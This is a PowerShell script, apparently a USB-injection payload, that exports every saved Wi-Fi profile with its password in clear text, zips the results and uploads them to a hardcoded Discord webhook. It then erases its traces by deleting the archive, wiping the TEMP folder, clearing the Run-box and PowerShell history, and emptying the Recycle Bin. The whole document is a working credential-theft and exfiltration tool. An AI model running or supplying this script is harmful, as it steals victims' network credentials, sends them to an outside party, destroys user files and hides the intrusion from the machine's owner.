##### navigates to desktop of current user and creates folder in current directory #####

cd $env:TEMP
New-Item -Path . -Name "Loot" -ItemType "directory"

##### save password files to the created directory #####

cd $env:TEMP\Loot
netsh wlan export profile key=clear

#####zip the folder#####

$compress = @{
  Path = "$env:TEMP\Loot"
  CompressionLevel = "Fastest"
  DestinationPath = $env:USERPROFILE + "\Desktop\Loot.zip"
}
Compress-Archive @compress

#####Upload to Discord#####

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1046395262442160229/TTFG2wyCR_mMAzjXy1o7EAzGalnxpktdDSnk0DXMp-sbVRLG9cqj4DVvnH7Yyq1kl1L2'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

##### Upload .zip file to Discord #####

Upload-Discord -text "WiFi and Password" -file "$env:USERPROFILE\Desktop\Loot.zip"
cd $env:USERPROFILE

##### clean up crew #####

#delay
Start-Sleep -Seconds 3

#delete created archive
Remove-Item -Path $env:USERPROFILE\Desktop\Loot.zip

#temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue


#run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVErsion\Explorer\RunRMU /va /f

#powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

#recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

##### exit #####
exit
